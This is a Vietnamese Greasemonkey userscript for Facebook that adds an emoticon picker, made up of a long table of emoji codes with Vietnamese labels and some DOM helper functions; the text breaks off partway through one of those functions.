// ==UserScript==
// @name            Thay ten Facebook 2014
// @description     All about facebook By Yeu khong
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Cười tươi"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Buồn chán"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Lè lưỡi"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Cười toe"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Ngạc nhiên"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Nháy mắt"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Cười há miệng"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Nhăn mặt"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Mếu"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Khóc"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Cười tít mắt"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Đeo kính trắng"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Đeo kính đen"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Trái tim"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Quỷ sứ"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Thiên thần"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Nhắm mắt lại"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Trợn tròn mắt"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Khó chịu quá"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Không quan tâm"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Thích"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Hôn cái coi"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Cá heo tức giận"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Chim cánh cụt"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Ăn shit nhé"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Thế cơ á?"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Mưa rồi, ô nè"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sóng biển"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Vầng trăng"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Ngôi sao"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Cỏ"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Cây cô đơn"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Xương rồng"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Hoa Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Hoa 5 cánh"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Hoa hồng"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cây hoa tròn"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Hoa hướng dương"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Cây lúa"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Hoa 4 mùa"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Lá phong"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Lá Fallen"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Lá xanh trước gió"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Quả quýt"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Táo đỏ"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Dâu tây, ăn đi"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Bánh mỳ ba tê"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Nước hoa quả"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Bia"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Hộp quà"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Quả bí ngô"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Cây thông Noel"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Ông già Noel"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Bóng bay"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Kèn cho Party"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Vương miệng"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Cặp đôi"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Đôi cá"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Kẹo gió"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Mũ cử nhân"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Bản nhạc"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Nốt nhạc"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Âm nhạc"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Con rắn"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Con ngựa"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Con dê"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Con khi"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Con gà"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Con lợn"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Con voi"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Con bạch tuộc"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Con ốc"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Con chăn"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Con cá"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Cá cảnh"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Cá mang phình"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Gà con"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Con chim"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Chim cánh cụt 2"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Gấu"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Chó thè lưỡi"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Con lạc đà"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Con cá voi"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mặt chuột"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Mặt bò"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Mặt mèo"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Mặt thỏ"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Mặt mèo lười"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Cá voi"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Mặt ngựa"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Mặt khỉ"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Mặt lợn"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Mặt ếch"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Mặt chuột Hamster"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Mặt chó sói"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Mặt gấu"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Bàn chân"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Ngó"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Hóng"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Mũi"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Hôn miếng nào"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Te tởn"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "Đứa comment ở trên rất gà"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "Đứa comment ở dưới rất gà"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "Bên trái em ơi"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "Bên phải em ơi"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Này thì nhìn đểu"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Vỗ tay ngay & luôn"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "OK, anh hiểu rồi"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Ưng ý của thím rồi"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Ý thím như ***"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Ủng hộ nhiệt tình"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Còng tay em lại đi"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "HOT Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "HOT Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "X - Men"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Phụ nữ"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Nắm tay cái xem nào"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Giờ các thím muốn gì? Cảnh sát đây"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Mới tậu cái tai thỏ"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Đầu mới"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Nhìn cũng đập chai phết"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Đây đập hơn nha cưng"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Ừ, còn mình thì già cmnr"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Em cũng già cmnr"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Mình còn nhỏ quá, chịu khó FA vậy"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Đội mũ đi làm nào"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Công chúa"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ma đây, xoắn chưa?"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Em là thiên thần, nhìn em giống con đần"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Hổ báo thế này được chưa?"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Hổ báo từ mẫu giáo"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Đủ cứng chưa?"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Đầu lâu"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Hoàng tử ba tư"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Con chúa ba lăm"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Sơn móng tay phát"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Yêu miếng"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Bọn mình hôn cmn nhau đê"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Hoa hòe"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Bọn mình trao tim cmn cho nhau đê"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Cố bắt Wifi trái tim em mới được"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Tim tôi vỡ cmnr"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Tim tôi tan chảy cmnr"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Trái tim 1"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Trái tim 2"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Trái tim 3"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Trái tim 4"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Trái tim 5"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Trái tim 6"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Chói cm tim thím lại"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Mạng nhện"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Ngủ thôi"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Phun"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Gió thổi vi vu"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Shit"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Cứng thế này ưng không?"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Máy tính mới tậu"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "CD nhạc"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Ổn cứng"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Đia trắng"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Anh nghe"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Có gì cứ gửi Fax cho anh"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Iphone 9"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Iphone 9s"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Đang xem TIVI"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Chuông"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Biểu tượng vui"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Khóc cmnr"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Cười"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Biểu tượng vui 2"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Biểu tượng vui 3"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Biểu tượng vui 4"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Biểu tượng vui 5"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Biểu tượng vui 6"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Biểu tượng vui 7"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Biểu tượng vui 8"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Chán vl"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Biểu tượng vui 9"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Biểu tượng vui 10"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Biểu tượng vui 11"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Biểu tượng vui 12"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Biểu tượng vui 13"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Biểu tượng vui 14"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Biểu tượng vui 15"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Biểu tượng vui 16"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Biểu tượng vui 17"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Mơ ka đề, chị nóng rồi đấy nhé"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Huhu..."
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Biểu tượng vui 18"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Biểu tượng vui 19"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Biểu tượng vui 20"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Biểu tượng vui 21"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Biểu tượng vui 22"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Ngủ cmnr nhé"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Hôm nay mệt vl"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Biểu tượng vui 23"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Biểu tượng vui 24"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Biểu tượng vui 25"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Biểu tượng vui 26"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Biểu tượng vui 27"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Biểu tượng vui 28"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Biểu tượng vui 29"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Biểu tượng vui 30"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Biểu tượng vui 31"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Biểu tượng vui 32"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Biểu tượng vui 33"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Biểu tượng vui 34"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Biểu tượng vui 35"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Biểu tượng vui 36"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Biểu tượng vui 37"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Đố biết tay trái hay phải?"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Tay ải tay ai?"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Biểu tượng vui 38"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Lên là lên lên luôn"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Dẹp ra để anh lên"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "Biểu tượng vui 39"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "Bị giật sét cmnr"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Người tuyết, Sapa mùa đông 2013"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Năm 2014 quyết tâm có GẤU"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Tay phải nhé"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "2, làm gấu của tớ nhé?"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Nắng lên rồi"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Mây trôi"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Thôi chết, mưa cmnr, ô đâu ô đâu?"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Làm cốc Cafe cho tỉnh táo, haizzz"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Bị hoa mắt cmnr"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Tôi yêu bạn"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
